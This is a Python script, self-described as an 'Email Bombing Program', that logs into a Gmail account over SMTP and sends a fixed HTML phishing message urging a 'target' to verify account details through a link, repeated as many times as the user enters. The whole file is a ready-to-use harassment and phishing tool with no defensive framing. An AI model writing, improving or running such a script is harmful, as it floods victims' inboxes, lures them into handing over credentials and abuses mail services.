import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import re
from getpass import getpass
from time import sleep

def is_valid_email(email):
    # Simple regex for email validation
    regex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return re.match(regex, email)

print("\n\n..:: Welcome to the Email Bombing Program ::..\n")
print("=" * 50)

# Get sender's email with validation
while True:
    from_email = input("\n..:: Enter your email\t\t\t: ")
    if is_valid_email(from_email):
        break
    print("Invalid email format. Please try again.")

# Securely get the app password
app_password = getpass("\n..:: Enter your email's app password\t: ")

try:
    # Set up the SMTP server connection
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(from_email, app_password)
    
    print("\n\t ( $ _ $ ) Login successful!\n")
    
    # Get recipient's email with validation
    while True:
        to_email = input("\n..:: Enter the target email's address\t\t\t\t: ")
        if is_valid_email(to_email):
            break
        print("Invalid email format. Please try again.")

    # Collect email details
    subject = input("\n..:: Enter the subject of the email (press enter to skip)\t: ")
    body = """
    <html>
    <body>
        <h1 style="color: #2d89ef;">Verify Your Account</h1>
        <p>Dear User,</p>
        <p>We noticed suspicious activity in your account and need you to verify your account details to ensure continued access. 
        Please click the link below to confirm your account:</p>
        <p><a href="https://example.com/verify-account" style="color: #1d70b8; text-decoration: none;">Verify My Account</a></p>
        <p>If you did not initiate this request, please contact our support team immediately.</p>
        <p>Thank you,<br>Your Security Team</p>
    </body>
    </html>
    """
    num_emails = int(input("\n..:: Enter the number of times to send the email\t\t: "))

    print("\nSending emails...\n")

    # Create the email message once and reuse it
    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'html'))
    message_text = msg.as_string()

    # Loop to send the specified number of emails
    for i in range(num_emails):
        try:
            server.sendmail(from_email, to_email, message_text)
            print(f"\t==> Email {i + 1} sent successfully!")
            sleep(1)  # Sleep for 1 second between emails

        except smtplib.SMTPException as e:
            print(f"Error sending email {i + 1}: {e}")

    print("\nAll emails sent successfully!")

except smtplib.SMTPAuthenticationError:
    print("\nAuthentication failed. Please check your credentials and try again.")
except Exception as e:
    print(f"\nAn error occurred: {e}")
finally:
    if server:
        try:
            server.quit()
        except smtplib.SMTPServerDisconnected:
            print("Server already disconnected.")
    print("\nProgram terminated.\n")
